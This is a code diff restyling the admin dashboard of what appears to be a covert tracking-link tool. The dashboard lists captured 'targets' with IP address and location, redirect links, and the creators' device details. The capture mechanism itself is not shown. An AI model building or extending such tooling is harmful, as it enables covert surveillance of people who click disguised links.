@@ -1,6 +1,5 @@
-
 import React, { useState, useEffect } from 'react';
-import { ShieldAlert, Terminal, Eye, Globe, Database, Server, LogOut, Search, Activity, Camera, MapPin, Cpu, Trash2, User, ExternalLink, HardDrive, Info } from 'lucide-react';
+import { ShieldAlert, Terminal, Eye, Globe, Database, Server, LogOut, Search, Activity, Camera, MapPin, Cpu, Trash2, User, ExternalLink, Info, AlertCircle, Trash } from 'lucide-react';
 import { CaptureReport, LinkConfig, OwnerInfo } from '../types';
 import ReportDetail from './ReportDetail';
 
@@ -24,7 +23,7 @@ const AdminPanel: React.FC = () => {
     if (res.ok) {
       setGlobalData(await res.json());
       setIsAuthenticated(true);
-    } else alert("ACCESS DENIED");
+    } else alert("ACCESS DENIED: Credentials Invalid.");
     setLoading(false);
   };
 
@@ -38,22 +37,23 @@ const AdminPanel: React.FC = () => {
     if (res.ok) setGlobalData(await res.json());
   };
 
-  const deleteReport = async (id: string) => {
-    if (!confirm('Purge this record from database?')) return;
+  const deleteReport = async (e: React.MouseEvent, id: string) => {
+    e.stopPropagation();
+    if (!confirm('Purge this record from global database?')) return;
     await fetch('/api/admin/delete-report', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ ...creds, username: creds.user, password: creds.pass, reportId: id })
+      body: JSON.stringify({ ...creds, reportId: id })
     });
     refreshData();
   };
 
   const deleteLink = async (id: string) => {
-    if (!confirm('Erase this Node and all associated data?')) return;
+    if (!confirm('Erase this Node and all associated capture data?')) return;
     await fetch('/api/admin/delete-link', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ ...creds, username: creds.user, password: creds.pass, linkId: id })
+      body: JSON.stringify({ ...creds, linkId: id })
     });
     refreshData();
   };
@@ -67,93 +67,161 @@ const AdminPanel: React.FC = () => {
 
   if (!isAuthenticated) {
     return (
-      <div className="min-h-screen bg-black flex items-center justify-center p-6 font-mono">
-        <div className="w-full max-w-sm bg-zinc-900 border-2 border-red-900 p-8 rounded-lg shadow-[0_0_50px_rgba(127,29,29,0.4)]">
-          <div className="flex flex-col items-center mb-8">
-            <ShieldAlert className="text-red-600 mb-4" size={48} />
-            <h1 className="text-red-500 text-xl font-black uppercase tracking-widest">Omega Console</h1>
+      <div className="min-h-screen bg-paper flex items-center justify-center p-6 font-sans">
+        <div className="w-full max-w-md bg-white border-3 border-ink rounded-[2.5rem] p-10 shadow-comic animate-pop">
+          <div className="flex flex-col items-center mb-10">
+            <div className="w-20 h-20 bg-brand-accent/10 rounded-[2rem] flex items-center justify-center border-3 border-ink mb-6 rotate-3">
+              <ShieldAlert className="text-brand-accent" size={40} />
+            </div>
+            <h1 className="text-3xl font-black text-ink italic uppercase tracking-tighter">Omega Command</h1>
+            <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2">Restricted Access Portal</p>
           </div>
-          <form onSubmit={handleLogin} className="space-y-4">
-            <input type="text" placeholder="CODENAME" value={creds.user} onChange={e => setCreds({...creds, user: e.target.value})} className="w-full bg-black border border-zinc-800 p-3 text-red-500 outline-none focus:border-red-600" />
-            <input type="password" placeholder="ACCESS KEY" value={creds.pass} onChange={e => setCreds({...creds, pass: e.target.value})} className="w-full bg-black border border-zinc-800 p-3 text-red-500 outline-none focus:border-red-600" />
-            <button className="w-full bg-red-900 text-white font-black py-3 hover:bg-red-800 transition-all uppercase text-sm tracking-widest">Initialize</button>
+          <form onSubmit={handleLogin} className="space-y-6">
+            <div className="space-y-2">
+              <label className="text-[10px] font-black text-ink/40 uppercase tracking-widest ml-1">Codename</label>
+              <input type="text" placeholder="ADMIN_USER" value={creds.user} onChange={e => setCreds({...creds, user: e.target.value})} className="w-full bg-paper border-3 border-ink rounded-2xl px-5 py-4 text-ink font-bold outline-none focus:bg-white transition-colors uppercase" />
+            </div>
+            <div className="space-y-2">
+              <label className="text-[10px] font-black text-ink/40 uppercase tracking-widest ml-1">Access Key</label>
+              <input type="password" placeholder="••••••••" value={creds.pass} onChange={e => setCreds({...creds, pass: e.target.value})} className="w-full bg-paper border-3 border-ink rounded-2xl px-5 py-4 text-ink font-bold outline-none focus:bg-white transition-colors" />
+            </div>
+            <button className="w-full bg-brand-accent text-white font-black py-5 rounded-3xl border-3 border-ink shadow-comic hover:translate-y-1 hover:shadow-comic-sm transition-all uppercase italic tracking-tighter">
+              {loading ? 'Validating...' : 'Authenticate Console'}
+            </button>
           </form>
         </div>
       </div>
     );
   }
 
-  const listReports = globalData?.reports.filter(r => r.location?.ip?.includes(search) || r.ownerId.includes(search)) || [];
-  const listLinks = globalData?.links.filter(l => l.name.toLowerCase().includes(search.toLowerCase()) || l.id.includes(search)) || [];
+  const listReports = globalData?.reports.filter(r => 
+    r.location?.ip?.includes(search) || 
+    r.ownerId.toLowerCase().includes(search.toLowerCase()) || 
+    r.linkId?.toLowerCase().includes(search.toLowerCase())
+  ) || [];
+
+  const listLinks = globalData?.links.filter(l => 
+    l.name.toLowerCase().includes(search.toLowerCase()) || 
+    l.id.includes(search) ||
+    l.ownerId.includes(search)
+  ) || [];
+
+  const listOwners = Object.values(globalData?.owners || {}).filter(o => 
+    o.ownerId.toLowerCase().includes(search.toLowerCase()) || 
+    o.ip?.includes(search)
+  );
 
   return (
-    <div className="min-h-screen bg-zinc-950 text-zinc-400 font-mono p-4 md:p-8">
-      <div className="max-w-7xl mx-auto space-y-6">
-        {/* Admin Nav */}
-        <div className="flex flex-col md:flex-row items-center justify-between gap-4 bg-zinc-900 p-6 rounded-xl border border-zinc-800 shadow-xl">
-          <div className="flex items-center gap-4">
-            <Terminal className="text-red-500" />
-            <h1 className="text-white font-black text-lg uppercase tracking-tighter">System Overseer</h1>
-            <div className="px-2 py-0.5 bg-red-900/30 border border-red-900/50 text-red-500 text-[10px] rounded uppercase font-bold">Live Stream</div>
+    <div className="min-h-screen bg-paper text-ink font-sans p-4 md:p-8 animate-pop">
+      <div className="max-w-7xl mx-auto space-y-8">
+        
+        {/* Header Console */}
+        <div className="comic-card p-8 bg-white border-brand-accent/20 flex flex-col md:flex-row md:items-center justify-between gap-6">
+          <div className="flex items-center gap-6">
+            <div className="bg-brand-accent p-4 border-3 border-ink -rotate-3 shadow-comic-sm">
+              <Terminal className="text-white" size={28} />
+            </div>
+            <div>
+              <h1 className="text-3xl font-black text-ink uppercase italic tracking-tighter">System Overseer</h1>
+              <div className="flex items-center gap-2 mt-1">
+                <div className="w-2 h-2 rounded-full bg-brand-sage animate-pulse" />
+                <span className="text-[10px] font-black text-ink/30 uppercase tracking-[0.3em]">Telemetry Relay: Active</span>
+              </div>
+            </div>
           </div>
-          <div className="flex items-center gap-2">
-            <button onClick={() => setTab('reports')} className={`px-4 py-2 text-xs font-black uppercase rounded-lg border ${tab === 'reports' ? 'bg-red-900/20 border-red-900 text-red-500' : 'border-zinc-800 text-zinc-600 hover:text-white'}`}>Intel</button>
-            <button onClick={() => setTab('links')} className={`px-4 py-2 text-xs font-black uppercase rounded-lg border ${tab === 'links' ? 'bg-red-900/20 border-red-900 text-red-500' : 'border-zinc-800 text-zinc-600 hover:text-white'}`}>Nodes</button>
-            <button onClick={() => setTab('owners')} className={`px-4 py-2 text-xs font-black uppercase rounded-lg border ${tab === 'owners' ? 'bg-red-900/20 border-red-900 text-red-500' : 'border-zinc-800 text-zinc-600 hover:text-white'}`}>Owners</button>
-            <button onClick={() => window.location.hash = '#/'} className="ml-4 p-2 text-zinc-600 hover:text-red-500"><LogOut size={20}/></button>
+          
+          <div className="flex flex-wrap items-center gap-3">
+            <nav className="flex bg-paper border-3 border-ink p-1 rounded-2xl">
+              {(['reports', 'links', 'owners'] as const).map((t) => (
+                <button 
+                  key={t}
+                  onClick={() => setTab(t)}
+                  className={`px-6 py-2 rounded-xl text-xs font-black uppercase italic transition-all ${tab === t ? 'bg-brand-accent text-white shadow-lg' : 'text-ink/40 hover:text-ink'}`}
+                >
+                  {t}
+                </button>
+              ))}
+            </nav>
+            <button onClick={() => window.location.hash = '#/'} className="comic-button bg-white px-6 py-3 font-black text-xs uppercase italic flex items-center gap-2">
+              <LogOut size={16} /> Exit Panel
+            </button>
           </div>
         </div>
 
-        {/* Global Overview */}
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+        {/* Global Vital Stats */}
+        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-8">
           {[
-            { label: 'Captures', val: globalData?.stats.totalReports, icon: Eye, color: 'text-blue-500' },
-            { label: 'Nodes', val: globalData?.stats.totalLinks, icon: Server, color: 'text-purple-500' },
-            { label: 'Owners', val: globalData?.stats.totalOwners, icon: User, color: 'text-green-500' },
-            { label: 'Targets', val: globalData?.stats.uniqueTargetIps, icon: Globe, color: 'text-orange-500' }
+            { label: 'Total Intercepts', val: globalData?.stats.totalReports, icon: Eye, color: 'text-brand-accent', bg: 'bg-brand-accent/5' },
+            { label: 'Active Nodes', val: globalData?.stats.totalLinks, icon: Server, color: 'text-brand-sage', bg: 'bg-brand-sage/5' },
+            { label: 'Owner Entities', val: globalData?.stats.totalOwners, icon: User, color: 'text-brand-light', bg: 'bg-slate-50' },
+            { label: 'Unique Targets', val: globalData?.stats.uniqueTargetIps, icon: Globe, color: 'text-brand-crimson', bg: 'bg-brand-crimson/5' }
           ].map((s, i) => (
-            <div key={i} className="bg-zinc-900 border border-zinc-800 p-6 rounded-xl relative overflow-hidden group">
-              <div className="absolute top-0 right-0 p-2 opacity-10 group-hover:scale-125 transition-transform"><s.icon size={48} /></div>
-              <span className="text-2xl font-black text-white block">{s.val}</span>
-              <span className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">{s.label}</span>
+            <div key={i} className="comic-card bg-white p-6 text-center group">
+              <div className={`${s.bg} w-12 h-12 rounded-2xl flex items-center justify-center mx-auto mb-4 border-2 border-ink shadow-comic-sm group-hover:-translate-y-1 transition-transform`}>
+                <s.icon className={s.color} size={20} />
+              </div>
+              <span className="text-3xl font-black text-ink block tracking-tighter italic">{s.val}</span>
+              <span className="text-[10px] font-black uppercase text-ink/30 tracking-[0.2em]">{s.label}</span>
             </div>
           ))}
         </div>
 
-        {/* Content Area */}
-        <div className="bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden min-h-[500px]">
-          <div className="p-6 border-b border-zinc-800 flex items-center justify-between">
-            <h2 className="text-sm font-black text-white uppercase italic tracking-widest flex items-center gap-2">
-              <Database size={16} /> Global Repository
+        {/* Intelligence Repository */}
+        <div className="comic-card bg-white min-h-[600px] flex flex-col overflow-hidden">
+          <div className="p-8 border-b-3 border-ink bg-paper flex flex-col md:flex-row md:items-center justify-between gap-4">
+            <h2 className="text-xl font-black text-ink uppercase italic tracking-tighter flex items-center gap-3">
+              <Database className="text-brand-accent" /> 
+              {tab === 'reports' ? 'Global Intercepts' : tab === 'links' ? 'Active Network Nodes' : 'Owner Intelligence'}
             </h2>
             <div className="relative">
-              <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-600" size={14} />
-              <input type="text" placeholder="FILTER SIGNALS..." className="bg-black border border-zinc-800 rounded pl-10 pr-4 py-2 text-[10px] font-bold text-red-500 outline-none w-64 uppercase" value={search} onChange={e => setSearch(e.target.value)} />
+              <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-ink/30" size={18} />
+              <input 
+                type="text" 
+                placeholder="Query database..." 
+                className="bg-white border-3 border-ink rounded-2xl pl-12 pr-6 py-3 text-sm font-bold text-ink outline-none focus:bg-brand-accent/5 w-full md:w-80 uppercase italic transition-colors"
+                value={search}
+                onChange={e => setSearch(e.target.value)}
+              />
             </div>
           </div>
 
-          <div className="overflow-x-auto">
+          <div className="flex-1 overflow-x-auto custom-scrollbar">
             {tab === 'reports' && (
-              <table className="w-full text-left text-[10px] font-bold uppercase border-collapse">
+              <table className="w-full text-left border-collapse">
                 <thead>
-                  <tr className="bg-zinc-950 border-b border-zinc-800 text-zinc-600 tracking-tighter">
-                    <th className="p-4">Time</th>
-                    <th className="p-4">Target IP</th>
-                    <th className="p-4">Owner</th>
-                    <th className="p-4">Location</th>
-                    <th className="p-4 text-right">Actions</th>
+                  <tr className="border-b-3 border-ink text-[11px] font-black text-ink/30 uppercase tracking-[0.2em] bg-paper">
+                    <th className="px-8 py-4">Timestamp</th>
+                    <th className="px-8 py-4">Signal Source (IP)</th>
+                    <th className="px-8 py-4">Node Origin</th>
+                    <th className="px-8 py-4">Geo-Data</th>
+                    <th className="px-8 py-4 text-right">Protocol</th>
                   </tr>
                 </thead>
-                <tbody className="divide-y divide-zinc-800/40">
+                <tbody className="divide-y-2 divide-paper">
                   {listReports.map((r, i) => (
-                    <tr key={i} className="hover:bg-zinc-800/30 transition-colors">
-                      <td className="p-4 text-zinc-500">{new Date(r.timestamp).toLocaleTimeString()}</td>
-                      <td className="p-4 text-red-500 font-mono">{r.location?.ip}</td>
-                      <td className="p-4 text-zinc-400">{r.ownerId}</td>
-                      <td className="p-4 text-zinc-500">{r.location?.city || 'NA'}, {r.location?.country || 'NA'}</td>
-                      <td className="p-4 text-right flex justify-end gap-2">
-                        <button onClick={() => setSelectedReport(r)} className="p-2 bg-blue-900/20 text-blue-500 rounded border border-blue-900/30 hover:bg-blue-500 hover:text-white"><ExternalLink size={12}/></button>
-                        <button onClick={() => deleteReport(r.id)} className="p-2 bg-red-900/20 text-red-500 rounded border border-red-900/30 hover:bg-red-500 hover:text-white"><Trash2 size={12}/></button>
+                    <tr key={i} className="group hover:bg-brand-accent/5 cursor-pointer transition-colors" onClick={() => setSelectedReport(r)}>
+                      <td className="px-8 py-6">
+                        <div className="flex flex-col">
+                          <span className="text-ink font-black text-sm italic">{new Date(r.timestamp).toLocaleDateString()}</span>
+                          <span className="text-[10px] font-bold text-ink/40">{new Date(r.timestamp).toLocaleTimeString()}</span>
+                        </div>
+                      </td>
+                      <td className="px-8 py-6 font-mono text-sm text-brand-accent font-bold">{r.location?.ip}</td>
+                      <td className="px-8 py-6">
+                        <div className="flex flex-col">
+                          <span className="text-ink font-black text-xs italic uppercase">{r.linkId}</span>
+                          <span className="text-[10px] font-bold text-ink/30">{r.ownerId}</span>
+                        </div>
+                      </td>
+                      <td className="px-8 py-6">
+                        <div className="flex items-center gap-2 text-xs font-black text-ink/60 uppercase italic">
+                          <MapPin size={14} className="text-brand-sage" /> {r.location?.city || 'Unassigned'}, {r.location?.country || 'UNK'}
+                        </div>
+                      </td>
+                      <td className="px-8 py-6 text-right">
+                        <button onClick={(e) => deleteReport(e, r.id)} className="p-3 bg-paper border-2 border-ink rounded-xl text-ink/30 hover:bg-brand-crimson hover:text-white transition-all shadow-comic-sm">
+                          <Trash size={16} />
+                        </button>
                       </td>
                     </tr>
                   ))}
@@ -162,25 +230,27 @@ const AdminPanel: React.FC = () => {
             )}
 
             {tab === 'links' && (
-              <table className="w-full text-left text-[10px] font-bold uppercase border-collapse">
+              <table className="w-full text-left border-collapse">
                 <thead>
-                  <tr className="bg-zinc-950 border-b border-zinc-800 text-zinc-600">
-                    <th className="p-4">Node Alias</th>
-                    <th className="p-4">Node ID</th>
-                    <th className="p-4">Owner ID</th>
-                    <th className="p-4">Redirect Destination</th>
-                    <th className="p-4 text-right">Actions</th>
+                  <tr className="border-b-3 border-ink text-[11px] font-black text-ink/30 uppercase bg-paper">
+                    <th className="px-8 py-4">Alias</th>
+                    <th className="px-8 py-4">Node Hash</th>
+                    <th className="px-8 py-4">Creator ID</th>
+                    <th className="px-8 py-4">Redirect</th>
+                    <th className="px-8 py-4 text-right">Erase</th>
                   </tr>
                 </thead>
                 <tbody>
                   {listLinks.map((l, i) => (
-                    <tr key={i} className="hover:bg-zinc-800/30 border-b border-zinc-800/50">
-                      <td className="p-4 text-white">{l.name}</td>
-                      <td className="p-4 text-zinc-500 font-mono">{l.id}</td>
-                      <td className="p-4 text-purple-400">{l.ownerId}</td>
-                      <td className="p-4 text-zinc-600 truncate max-w-[200px]">{l.redirectUrl}</td>
-                      <td className="p-4 text-right">
-                        <button onClick={() => deleteLink(l.id)} className="p-2 text-red-500 hover:bg-red-500 hover:text-white transition-all rounded"><Trash2 size={14}/></button>
+                    <tr key={i} className="border-b-2 border-paper hover:bg-paper transition-all">
+                      <td className="px-8 py-6 text-ink font-black italic">{l.name}</td>
+                      <td className="px-8 py-6 font-mono text-xs text-brand-accent font-bold">{l.id}</td>
+                      <td className="px-8 py-6 text-ink/60 font-black text-xs uppercase">{l.ownerId}</td>
+                      <td className="px-8 py-6 text-[10px] text-ink/40 truncate max-w-[200px] font-bold italic">{l.redirectUrl}</td>
+                      <td className="px-8 py-6 text-right">
+                        <button onClick={() => deleteLink(l.id)} className="p-3 border-2 border-ink text-brand-crimson hover:bg-brand-crimson hover:text-white transition-all rounded-xl shadow-comic-sm">
+                          <Trash2 size={16} />
+                        </button>
                       </td>
                     </tr>
                   ))}
@@ -189,18 +259,18 @@ const AdminPanel: React.FC = () => {
             )}
 
             {tab === 'owners' && (
-              <div className="p-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                {Object.values(globalData?.owners || {}).map((o, i) => (
-                  <div key={i} className="bg-black border border-zinc-800 p-6 rounded-xl space-y-4">
-                    <div className="flex items-center justify-between">
-                       <h3 className="text-white font-black">{o.ownerId}</h3>
-                       <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+              <div className="p-8 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 bg-paper/50">
+                {listOwners.map((o, i) => (
+                  <div key={i} className="bg-white border-3 border-ink p-8 rounded-[2rem] shadow-comic-sm hover:-translate-y-1 transition-all relative overflow-hidden group">
+                    <div className="absolute top-0 right-0 p-6 opacity-5 group-hover:scale-110 transition-transform"><User size={64}/></div>
+                    <div className="flex items-center justify-between mb-6">
+                       <h3 className="text-ink font-black uppercase italic tracking-tighter text-lg">{o.ownerId}</h3>
+                       <div className="px-3 py-1 bg-brand-sage/10 border-2 border-ink rounded-lg text-[9px] font-black uppercase text-brand-sage">Authorized</div>
                     </div>
-                    <div className="space-y-2 text-[10px] font-mono text-zinc-500">
-                       <p className="flex justify-between border-b border-zinc-900 pb-1"><span>CREATOR IP</span> <span className="text-red-500">{o.ip}</span></p>
-                       <p className="flex justify-between border-b border-zinc-900 pb-1"><span>OS</span> <span className="text-zinc-300">{o.device?.os}</span></p>
-                       <p className="flex justify-between border-b border-zinc-900 pb-1"><span>BROWSER</span> <span className="text-zinc-300">{o.device?.browser}</span></p>
-                       <p className="flex justify-between"><span>LAST ACTIVE</span> <span className="text-zinc-300">{new Date(o.lastActive).toLocaleString()}</span></p>
+                    <div className="space-y-4 text-[10px] font-black uppercase tracking-widest text-ink/40">
+                       <div className="flex justify-between border-b-2 border-paper pb-2"><span>CREATOR IP</span> <span className="text-brand-accent font-mono">{o.ip}</span></div>
+                       <div className="flex justify-between border-b-2 border-paper pb-2"><span>ENV</span> <span className="text-ink/80">{o.device?.os} / {o.device?.browser}</span></div>
+                       <div className="flex justify-between"><span>LAST SYNC</span> <span className="text-ink/80">{new Date(o.lastActive).toLocaleTimeString()}</span></div>
                     </div>
                   </div>
                 ))}
